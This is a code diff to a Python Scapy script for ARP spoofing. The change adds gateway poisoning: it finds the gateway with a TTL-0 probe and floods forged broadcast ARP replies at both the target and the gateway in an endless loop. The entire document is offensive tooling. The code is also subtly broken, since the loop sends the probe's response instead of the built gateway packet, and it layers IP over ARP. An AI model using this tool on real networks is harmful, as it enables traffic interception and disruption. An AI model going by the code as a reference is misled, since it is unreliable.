@@ -19,19 +19,26 @@ def parse_command():
 
 
 def main():
+    gateway_address = None  # We will only use this in the case that the gateway is to be attacked
     src_address = None  # src_address for the ARP response. Defined here so it can be assigned to within a condition
     if args.src is None:  # If no src argument was supplied
         src_address = IP().src  # Get the devices IP address
     else:
         src_address = args.src  # Get the IP address supplied as command-line argument
     if args.gw:
-        pass
+        gtwy = sr1(IP(dst='8.8.8.8', ttl=0))
+        gateway_address = gtwy.src
     pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2)/IP(src=src_address, dst=args.target)
+    gtwy_pkt = None
+    if args.gw:
+        gtwy_pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2)/IP(src=src_address, dst=gateway_address)
     pkt.show()
     while True:
         sendp(pkt, iface=args.iface)
+        if args.gw:
+            sendp(gtwy, iface=args.iface)
         time.sleep(args.delay)
-        
+
 
 if __name__ == '__main__':
     args = parse_command()
